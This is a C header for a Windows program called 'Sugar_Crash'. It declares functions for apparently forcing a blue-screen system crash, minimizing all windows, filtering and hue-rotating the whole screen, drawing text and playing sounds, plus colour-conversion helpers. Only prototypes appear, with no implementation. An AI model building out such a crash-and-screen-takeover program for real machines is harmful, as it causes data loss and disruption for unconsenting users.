#ifndef _SUGAR_CRASH
#define _SUGAR_CRASH

#include <Windows.h>
#include <tchar.h>

#define THREAD WINAPI
#define FILTER

/////////////////////////////////////////////////////////////////////////
// main
/////////////////////////////////////////////////////////////////////////

INT Sugar_Crash(VOID);

/////////////////////////////////////////////////////////////////////////
// system
/////////////////////////////////////////////////////////////////////////

VOID Sugar_BlueScreen(NTSTATUS ntErrorStatus);

VOID Sugar_MinimizeAll(VOID);

HGLOBAL Sugar_GetProcessResource(LPCTSTR lpName, LPCTSTR lpType);

DWORD Sugar_Random(DWORD dwMin, DWORD dwMax);

BOOL Sugar_PlayWaveResource(LPCTSTR lpResName);

/////////////////////////////////////////////////////////////////////////
// screen
/////////////////////////////////////////////////////////////////////////

typedef VOID(FILTER SGRPIXELFILTERPROC)(RGBQUAD *prgbPixel, LPVOID lpParam);

VOID FILTER HueRotate(RGBQUAD *prgbPixel, LPVOID lpAngle);

VOID Sugar_ScreenPixelFilter(SGRPIXELFILTERPROC filter, LPVOID lpParam);

VOID Sugar_ScreenDrawText(const PPOINT pPoint, LPCTSTR lpText);

VOID Sugar_ScreenGetRandomPoint(PPOINT pPoint);

DWORD Sugar_ScreenGetFrequency(VOID);

/////////////////////////////////////////////////////////////////////////
// HSV
/////////////////////////////////////////////////////////////////////////

typedef struct _HSVQUAD {
    FLOAT fHue;
    FLOAT fSaturation;
    FLOAT fValue;
    FLOAT fReserved;
} HSVQUAD;

VOID ConvertRGBtoHSV(const RGBQUAD *rgb, HSVQUAD *hsv);

VOID ConvertHSVtoRGB(const HSVQUAD *hsv, RGBQUAD *rgb);

#endif /* _SUGAR_CRASH */